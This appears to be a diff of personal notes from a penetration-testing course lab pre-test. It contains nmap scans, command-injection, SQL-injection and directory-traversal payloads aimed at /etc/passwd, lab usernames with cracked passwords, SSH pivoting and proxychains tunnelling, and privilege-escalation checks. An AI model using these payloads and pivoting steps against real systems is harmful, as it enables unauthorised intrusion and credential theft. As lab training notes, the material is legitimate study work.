@@ -81,21 +81,47 @@ xfreerdp /u:comrade /v:0.0.0.0:1900 /p:StudentMidwayPassword /size:1920x1000 +cl
 
 
 Pre-Test
+
 5 boxes
-ignore .190
+ignore .190 and 10.10
 Lin-Ops -> 10.50.46.125
 2 Root/Admin 
+
 1)10.50.46.125 port 22,80
-nmap -v -sT -Pn -T4 -sV 192.168.28.129,112,113,114 
-user2 [1] => RntyrfVfNER78 [pass]
- user3 [1] => Obo4GURRnccyrf [pass]
+nmap -v -sT -Pn -T4 -sV 10.50.46.125
+nmap -v -sT -Pn -T4 -sV --script=http-enum.nse 10.50.46.125 -p 80
+
+cmd injection ;whoami
+SQL injection admin' or 1='1
+Directory Traversal ../../../../../etc/passwd, /etc/hosts, 
+
+user2 [1] => RntyrfVfNER78 [pass] - EaglesIsARE78
+ user3 [1] => Obo4GURRnccyrf [pass] -  Bob4THEEapples
 Lee_Roth [1] => anotherpassword4THEages
-user2 = EaglesIsARE78
+
 cat /etc/hosts
 ip n
 arp -a
---scripts http-enum
-2)192.168.28.181 WebApp 80
+
+ssh -MS /tmp/gray user2@10.50.46.125
+
+sudo -l
+find perm command
+crontab
+
+for i in {1..254} ;do (ping -c 1 192.168.28.$i | grep "bytes from" &) ;done
+192.168.28.172,181
+
+ssh -s /tmp/gray/gray -O forward -D9050
+
+proxychains nmap -v -sT -Pn -T4 -sV 192.168.28.172,181
+
+192.168.28.172 22
+192.168.28.181 WebApp 22,80
+
+ssh -S /tmp/gray gray -O forward -L 1330:192.168.28.181:80
+nmap -v -sT -Pn -T4 -sV --script=http-enum.nse 192.168.28.181 -p 80
+
 3)
 4)
 UNION SELECT table_schema,column_name,table_name FROM information_schema.columns
